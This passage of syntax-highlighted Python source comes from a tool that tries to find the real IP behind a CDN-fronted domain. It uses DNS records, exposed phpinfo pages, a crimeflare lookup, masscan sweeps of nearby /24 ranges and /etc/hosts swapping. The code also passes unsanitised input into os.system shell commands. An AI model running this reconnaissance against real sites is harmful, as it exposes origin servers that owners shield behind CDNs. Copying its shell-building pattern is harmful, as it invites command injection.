class="token punctuation">(</span><span class="token string">"vpn is off,connect vpn first"</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> domain<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"http"</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>"domain format error<span class="token punctuation">,</span>make sure domain has no http<span class="token punctuation">,</span>like www<span class="token punctuation">.</span>baidu<span class="token punctuation">.</span>com but <span class="token operator">not</span> \http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>baidu<span class="token punctuation">.</span>com"<span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#首先保证hosts文件中没有与domain相关的项,有则删除相关</span>        domainPattern<span class="token operator">=</span>domain<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token string">"\."</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#下面的sed的正则中不能有\n,sed匹配\n比较特殊</span>        <span class="token comment" spellcheck="true">#http://stackoverflow.com/questions/1251999/how-can-i-replace-a-newline-n-using-sed</span>        command<span class="token operator">=</span><span class="token string">"sed -ri 's/.*\s+%s//' /etc/hosts"</span> <span class="token operator">%</span> domainPattern        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>command<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>domain<span class="token operator">=</span>domain        self<span class="token punctuation">.</span>http_or_https<span class="token operator">=</span>get_http_or_https<span class="token punctuation">(</span>self<span class="token punctuation">.</span>domain<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'domain的http或https是:%s'</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>http_or_https<span class="token punctuation">)</span>        result<span class="token operator">=</span>get_request<span class="token punctuation">(</span>self<span class="token punctuation">.</span>http_or_https<span class="token operator">+</span><span class="token string">"://"</span><span class="token operator">+</span>self<span class="token punctuation">.</span>domain<span class="token punctuation">,</span><span class="token string">'seleniumPhantomJS'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>domain_title<span class="token operator">=</span>result<span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span>        <span class="token comment" spellcheck="true">#下面调用相当于main函数的get_actual_ip_from_domain函数</span>        actual_ip <span class="token operator">=</span> self<span class="token punctuation">.</span>get_actual_ip_from_domain<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> actual_ip <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"恭喜,%s的真实ip是%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>domain<span class="token punctuation">,</span> actual_ip<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#下面用来存放关键返回值</span>        self<span class="token punctuation">.</span>return_value<span class="token operator">=</span>actual_ip    <span class="token keyword">def</span> <span class="token function">domain_has_cdn</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 检测domain是否有cdn</span>        <span class="token comment" spellcheck="true"># 有cdn时,返回一个字典,如果cdn是cloudflare，返回{'has_cdn':1,'is_cloud_flare':1}</span>        <span class="token comment" spellcheck="true"># 否则返回{'has_cdn':1,'is_cloud_flare':0}或{'has_cdn':0,'is_cloud_flare':0}</span>        <span class="token keyword">import</span> re        CLIOutput<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>good_print<span class="token punctuation">(</span><span class="token string">"现在检测domain:%s是否有cdn"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>domain<span class="token punctuation">)</span>        has_cdn <span class="token operator">=</span> <span class="token number">0</span>        <span class="token comment" spellcheck="true"># ns记录和mx记录一样,都要查顶级域名,eg.dig +short www.baidu.com ns VS dig +short baidu.com ns</span>        result <span class="token operator">=</span> get_string_from_command<span class="token punctuation">(</span><span class="token string">"dig ns %s +short"</span> <span class="token operator">%</span> get_root_domain<span class="token punctuation">(</span>self<span class="token punctuation">.</span>domain<span class="token punctuation">)</span><span class="token punctuation">)</span>        pattern <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>            r<span class="token string">"(cloudflare)|(cdn)|(cloud)|(fast)|(incapsula)|(photon)|(cachefly)|(wppronto)|(softlayer)|(incapsula)|(jsdelivr)|(akamai)"</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>        cloudflare_pattern <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">"cloudflare"</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>        <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>cloudflare_pattern<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"has_cdn=1 from ns,and cdn is cloudflare"</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token string">'has_cdn'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'is_cloud_flare'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">}</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"has_cdn=1 from ns"</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token string">'has_cdn'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'is_cloud_flare'</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># 下面通过a记录个数来判断,如果a记录个数>1个,认为有cdn</span>            result <span class="token operator">=</span> get_string_from_command<span class="token punctuation">(</span><span class="token string">"dig a %s +short"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>domain<span class="token punctuation">)</span>            find_a_record_pattern <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">"((\d{1,3}\.){3}\d{1,3})"</span><span class="token punctuation">,</span> result<span class="token punctuation">)</span>            <span class="token keyword">if</span> find_a_record_pattern<span class="token punctuation">:</span>                ip_count <span class="token operator">=</span> <span class="token number">0</span>                <span class="token keyword">for</span> each <span class="token keyword">in</span> find_a_record_pattern<span class="token punctuation">:</span>                    ip_count <span class="token operator">+=</span> <span class="token number">1</span>                <span class="token keyword">if</span> ip_count <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">:</span>                    has_cdn <span class="token operator">=</span> <span class="token number">1</span>                    <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token string">'has_cdn'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'is_cloud_flare'</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token string">'has_cdn'</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'is_cloud_flare'</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">}</span>    <span class="token keyword">def</span> <span class="token function">get_domain_actual_ip_from_phpinfo</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 从phpinfo页面尝试获得真实ip</span>        CLIOutput<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>good_print<span class="token punctuation">(</span><span class="token string">"现在尝试从domain:%s可能存在的phpinfo页面获取真实ip"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>domain<span class="token punctuation">)</span>        phpinfo_page_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"info.php"</span><span class="token punctuation">,</span> <span class="token string">"phpinfo.php"</span><span class="token punctuation">,</span> <span class="token string">"test.php"</span><span class="token punctuation">,</span> <span class="token string">"l.php"</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> each <span class="token keyword">in</span> phpinfo_page_list<span class="token punctuation">:</span>            url <span class="token operator">=</span> self<span class="token punctuation">.</span>http_or_https <span class="token operator">+</span> <span class="token string">"://"</span> <span class="token operator">+</span> self<span class="token punctuation">.</span>domain <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> each            CLIOutput<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>good_print<span class="token punctuation">(</span><span class="token string">"现在访问%s"</span> <span class="token operator">%</span> url<span class="token punctuation">)</span>            visit <span class="token operator">=</span> get_request<span class="token punctuation">(</span>url<span class="token punctuation">,</span><span class="token string">'seleniumPhantomJS'</span><span class="token punctuation">)</span>            code <span class="token operator">=</span> visit<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span>            content <span class="token operator">=</span> visit<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span>            pattern <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">"remote_addr"</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>            <span class="token keyword">if</span> code <span class="token operator">==</span> <span class="token number">200</span> <span class="token operator">and</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>each<span class="token punctuation">)</span>                actual_ip <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"REMOTE_ADDR[^\.\d]+([\d\.]{7,15})[^\.\d]+"</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> actual_ip        <span class="token comment" spellcheck="true"># return 0代表没有通过phpinfo页面得到真实ip</span>        <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token keyword">def</span> <span class="token function">flush_dns</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 这个函数用来刷新本地dns cache</span>        <span class="token comment" spellcheck="true"># 要刷新dns cache才能让修改hosts文件有效</span>        CLIOutput<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>good_print<span class="token punctuation">(</span><span class="token string">"现在刷新系统的dns cache"</span><span class="token punctuation">)</span>        command <span class="token operator">=</span> <span class="token string">"service network-manager restart &amp;&amp; /etc/init.d/networking force-reload"</span>        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>command<span class="token punctuation">)</span>        <span class="token keyword">import</span> time        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">modify_hosts_file_with_ip_and_domain</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 这个函数用来修改hosts文件</span>        CLIOutput<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>good_print<span class="token punctuation">(</span><span class="token string">"现在修改hosts文件"</span><span class="token punctuation">)</span>        exists_domain_line <span class="token operator">=</span> <span class="token boolean">False</span>        <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"/etc/hosts"</span><span class="token punctuation">,</span> <span class="token string">"r+"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            file_content <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"%s"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>domain<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token string">"\."</span><span class="token punctuation">)</span><span class="token punctuation">,</span> file_content<span class="token punctuation">)</span><span class="token punctuation">:</span>            exists_domain_line <span class="token operator">=</span> <span class="token boolean">True</span>        <span class="token keyword">if</span> exists_domain_line <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sed -ri 's/.*%s.*/%s    %s/' %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>domain<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token string">"\."</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ip<span class="token punctuation">,</span> self<span class="token punctuation">.</span>domain<span class="token punctuation">,</span> <span class="token string">"/etc/hosts"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"echo %s %s >> /etc/hosts"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>ip<span class="token punctuation">,</span> self<span class="token punctuation">.</span>domain<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">check_if_ip_is_actual_ip_of_domain</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 通过修改hosts文件检测ip是否是domain对应的真实ip</span>        <span class="token comment" spellcheck="true"># 如果是则返回True,否则返回False</span>        <span class="token comment" spellcheck="true">#CLIOutput().good_print("现在通过修改hosts文件并刷新dns的方法检测ip:%s是否是domain:%s的真实ip" % (ip,self.domain))</span>        <span class="token comment" spellcheck="true">#python通过requests库或mechanicalsoup库或selenium_phantomjs来请求时不会被dns缓存影响，只会被hosts文件影响dns解析,人工用浏览器访问域名则会受dns缓存影响</span>        CLIOutput<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>good_print<span class="token punctuation">(</span><span class="token string">"现在通过修改hosts文件的方法检测ip:%s是否是domain:%s的真实ip"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>ip<span class="token punctuation">,</span>self<span class="token punctuation">.</span>domain<span class="token punctuation">)</span><span class="token punctuation">)</span>        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"cp /etc/hosts /etc/hosts.bak"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>modify_hosts_file_with_ip_and_domain<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#python通过requests库或mechanicalsoup库或selenium_phantomjs来请求时不会被dns缓存影响，只会被hosts文件影响dns解析,人工用浏览器访问域名则会受dns缓存影响</span>        <span class="token comment" spellcheck="true">#self.flush_dns()</span>        hosts_changed_domain_title<span class="token operator">=</span> get_request<span class="token punctuation">(</span>self<span class="token punctuation">.</span>http_or_https <span class="token operator">+</span> <span class="token string">"://%s"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>domain<span class="token punctuation">,</span><span class="token string">'selenium_phantom_js'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span>        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"rm /etc/hosts &amp;&amp; mv /etc/hosts.bak /etc/hosts"</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#这里要用title判断,html判断不可以,title相同则认为相同</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>domain_title <span class="token operator">==</span> hosts_changed_domain_title<span class="token punctuation">:</span>            CLIOutput<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>good_print<span class="token punctuation">(</span><span class="token string">"检测到真实ip!!!!!!"</span><span class="token punctuation">,</span><span class="token string">'red'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            CLIOutput<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>good_print<span class="token punctuation">(</span><span class="token string">"当前ip不是域名的真实ip"</span><span class="token punctuation">,</span><span class="token string">'yellow'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">def</span> <span class="token function">get_c_80_or_443_list</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 得到ip的整个c段的开放80端口或443端口的ip列表</span>        <span class="token keyword">if</span> <span class="token string">"not found"</span> <span class="token keyword">in</span> get_string_from_command<span class="token punctuation">(</span><span class="token string">"masscan"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true">#这里不用nmap扫描,nmap扫描结果不准</span>            os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"apt-get install masscan"</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>http_or_https<span class="token operator">==</span><span class="token string">"http"</span><span class="token punctuation">:</span>            scanPort<span class="token operator">=</span><span class="token number">80</span>            CLIOutput<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>good_print<span class="token punctuation">(</span><span class="token string">"现在进行%s的c段开了80端口机器的扫描"</span> <span class="token operator">%</span> ip<span class="token punctuation">)</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>http_or_https<span class="token operator">==</span><span class="token string">"https"</span><span class="token punctuation">:</span>            scanPort<span class="token operator">=</span><span class="token number">443</span>            CLIOutput<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>good_print<span class="token punctuation">(</span><span class="token string">"现在进行%s的c段开了443端口机器的扫描"</span> <span class="token operator">%</span> ip<span class="token punctuation">)</span>        masscan_command <span class="token operator">=</span> <span class="token string">"masscan -p%d %s/24 > /tmp/masscan.out"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>scanPort<span class="token punctuation">,</span>ip<span class="token punctuation">)</span>        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>masscan_command<span class="token punctuation">)</span>        <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"/tmp/masscan.out"</span><span class="token punctuation">,</span> <span class="token string">"r+"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            strings <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#os.system("rm /tmp/masscan.out")</span>        <span class="token keyword">import</span> re        allIP<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">"((\d{1,3}\.){3}\d{1,3})"</span><span class="token punctuation">,</span>strings<span class="token punctuation">)</span>        ipList<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> each <span class="token keyword">in</span> allIP<span class="token punctuation">:</span>            ipList<span class="token punctuation">.</span>append<span class="token punctuation">(</span>each<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>ipList<span class="token punctuation">)</span>        <span class="token keyword">return</span> ipList    <span class="token keyword">def</span> <span class="token function">check_if_ip_c_machines_has_actual_ip_of_domain</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 检测ip的c段有没有domain的真实ip,如果有则返回真实ip,如果没有则返回0</span>        CLIOutput<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>good_print<span class="token punctuation">(</span><span class="token string">"现在检测ip为%s的c段中有没有%s的真实ip"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>ip<span class="token punctuation">,</span>self<span class="token punctuation">.</span>domain<span class="token punctuation">)</span><span class="token punctuation">)</span>        target_list<span class="token operator">=</span>self<span class="token punctuation">.</span>get_c_80_or_443_list<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>        <span class="token keyword">for</span> each_ip <span class="token keyword">in</span> target_list<span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token boolean">True</span> <span class="token operator">==</span> self<span class="token punctuation">.</span>check_if_ip_is_actual_ip_of_domain<span class="token punctuation">(</span>each_ip<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> each_ip        <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token keyword">def</span> <span class="token function">get_ip_from_mx_record</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 从mx记录中得到ip列表,尝试从mx记录中的c段中找真实ip</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"尝试从mx记录中找和%s顶级域名相同的mx主机"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>domain<span class="token punctuation">)</span>        <span class="token keyword">import</span> socket        <span class="token comment" spellcheck="true"># domain.eg:www.baidu.com</span>        <span class="token keyword">from</span> exp10it <span class="token keyword">import</span> get_root_domain        root_domain <span class="token operator">=</span> get_root_domain<span class="token punctuation">(</span>self<span class="token punctuation">.</span>domain<span class="token punctuation">)</span>        <span class="token keyword">from</span> exp10it <span class="token keyword">import</span> get_string_from_command        result <span class="token operator">=</span> get_string_from_command<span class="token punctuation">(</span><span class="token string">"dig %s +short mx"</span> <span class="token operator">%</span> root_domain<span class="token punctuation">)</span>        sub_domains_list <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">"\d{1,} (.*\.%s)\."</span> <span class="token operator">%</span> root_domain<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token string">"\."</span><span class="token punctuation">)</span><span class="token punctuation">,</span> result<span class="token punctuation">)</span>        ip_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> each <span class="token keyword">in</span> sub_domains_list<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>each<span class="token punctuation">)</span>            ip <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostbyname_ex<span class="token punctuation">(</span>each<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>            <span class="token keyword">if</span> ip<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">not</span> <span class="token keyword">in</span> ip_list<span class="token punctuation">:</span>                ip_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ip<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> ip_list    <span class="token keyword">def</span> <span class="token function">check_if_mx_c_machines_has_actual_ip_of_domain</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 检测domain的mx记录所在ip[或ip列表]的c段中有没有domain的真实ip</span>        <span class="token comment" spellcheck="true"># 有则返回真实ip,没有则返回0</span>        CLIOutput<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>good_print<span class="token punctuation">(</span><span class="token string">"尝试从mx记录的c段中查找是否存在%s的真实ip"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>domain<span class="token punctuation">)</span>        ip_list <span class="token operator">=</span> self<span class="token punctuation">.</span>get_ip_from_mx_record<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> ip_list <span class="token operator">!=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> each_ip <span class="token keyword">in</span> ip_list<span class="token punctuation">:</span>                result <span class="token operator">=</span> self<span class="token punctuation">.</span>check_if_ip_c_machines_has_actual_ip_of_domain<span class="token punctuation">(</span>each_ip<span class="token punctuation">)</span>                <span class="token keyword">if</span> result <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> result                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>        <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token keyword">def</span> <span class="token function">get_ip_value_from_online_cloudflare_interface</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 从在线的cloudflare查询真实ip接口处查询真实ip</span>        <span class="token comment" spellcheck="true"># 如果查询到真实ip则返回ip值,如果没有查询到则返回0</span>        CLIOutput<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>good_print<span class="token punctuation">(</span><span class="token string">"现在从在线cloudflare类型cdn查询真实ip接口尝试获取真实ip"</span><span class="token punctuation">)</span>        url <span class="token operator">=</span> <span class="token string">"http://www.crimeflare.com/cgi-bin/cfsearch.cgi"</span>        post_data <span class="token operator">=</span> <span class="token string">'cfS=%s'</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>domain        content <span class="token operator">=</span> post_request<span class="token punctuation">(</span>url<span class="token punctuation">,</span> post_data<span class="token punctuation">)</span>        findIp <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"((\d{1,3}\.){3}\d{1,3})"</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>        <span class="token keyword">if</span> findIp<span class="token punctuation">:</span>            <span class="token keyword">return</span> findIp<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token keyword">def</span> <span class="token function">get_actual_ip_from_domain</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 尝试获得domain背后的真实ip,前提是domain有cdn</span>        <span class="token comment" spellcheck="true"># 如果找到了则返回ip,如果没有找到返回0</span>        CLIOutput<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>good_print<span class="token punctuation">(</span><span class="token string">"进入获取真实ip函数,认为每个domain都是有cdn的情况来处理"</span><span class="token punctuation">)</span>        <span class="token keyword">import</span> socket        has_cdn_value <span class="token operator">=</span> self<span class="token punctuation">.</span>domain_has_cdn<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> has_cdn_value<span class="token punctuation">[</span><span class="token string">'has_cdn'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>            CLIOutput<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>good_print<span class="token punctuation">(</span><span class="token string">"检测到domain:%s的A记录不止一个,认为它有cdn"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>domain<span class="token punctuation">)</span>            <span class="token keyword">pass</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            CLIOutput<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>good_print<span class="token punctuation">(</span><span class="token string">"Attention...!!! Domain doesn't have cdn,I will return the only one ip"</span><span class="token punctuation">)</span>            true_ip <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostbyname_ex<span class="token punctuation">(</span>self<span class="token punctuation">.</span>domain<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            <span class="token keyword">return</span> true_ip        <span class="token comment" spellcheck="true"># 下面尝试通过cloudflare在线查询真实ip接口获取真实ip</span>        <span class="token keyword">if</span> has_cdn_value<span class="token punctuation">[</span><span class="token string">'is_cloud_flare'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>            ip_value <span class="token operator">=</span> self<span class="token punctuation">.</span>get_ip_value_from_online_cloudflare_interface<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> ip_value <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> ip_value            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">pass</span>        <span class="token comment" spellcheck="true"># 下面尝试通过可能存在的phpinfo页面获得真实ip</span>        ip_from_phpinfo <span class="token operator">=</span> self<span class="token punctuation">.</span>get_domain_actual_ip_from_phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> ip_from_phpinfo <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> ip_from_phpinfo        <span class="token comment" spellcheck="true"># 下面通过mx记录来尝试获得真实ip</span>        result <span class="token operator">=</span> self<span class="token punctuation">.</span>check_if_mx_c_machines_has_actual_ip_of_domain<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> result <span class="token operator">==</span> <span class="token 